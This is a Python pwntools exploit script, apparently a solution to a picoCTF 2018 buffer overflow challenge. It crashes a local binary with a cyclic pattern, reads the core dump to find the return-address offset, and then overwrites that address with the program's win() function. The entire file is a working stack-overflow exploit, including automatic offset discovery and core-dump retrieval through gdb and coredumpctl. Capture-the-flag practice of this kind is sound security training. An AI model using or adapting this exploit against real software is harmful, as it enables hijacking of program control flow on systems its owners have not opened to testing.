# https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/buffer%20overflow%201.md
import pwn
from pwn import *
import os

EXECUTABLE = "test"
LOCAL_PATH = "/tmp/"

def get_process_path():
    return LOCAL_PATH + EXECUTABLE

def get_process():
    path = get_process_path()
    params = {"argv": path, "cwd": os.path.dirname(path)}
    p = process(**params)
    return p

def get_core_file(proc):
    #pid = gdb.attach(proc)

    try:
        core = proc.corefile
    except:
        core = None

    if core == None:
        try:
            pid = gdb.attach(proc)
            core = gdb.corefile(proc)
            print("Getting from GDB Attached")
        except:
            pass

    if core == None:
        # https://www.reddit.com/r/linuxadmin/comments/67xklw/core_file_for_segfault_did_not_generate/
        print("Getting from coredumpctl journal")
        command = f'coredumpctl dump {get_process_path()} --output /tmp/corefile'
        print(command)
        os.system(command)
        core = Core('/tmp/corefile')
    return core

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    #os.system("echo /tmp/core/core_dump > /proc/sys/kernel/core_pattern")

    proc = process(get_process_path())
    payload = pwn.cyclic(1000)
    print(payload)

    proc.send(payload+b'\n')
    core = get_core_file(proc)
    #proc.wait()


    offset = pwn.cyclic_find(core.rip, n=8)
    log.info("Overflow offset: {}".format(offset))
    return offset

e = ELF(get_process_path())
#print(e.symbols)
log.info("Address of win(): 0x{:02X}".format(e.symbols["win"]))

offset = get_overflow_offset()
print(offset)

p = get_process()#args.ssh_user)
payload = pwn.fit({offset: e.symbols["win"]})
print(payload)
p.sendline(payload)
print(p.recvall())
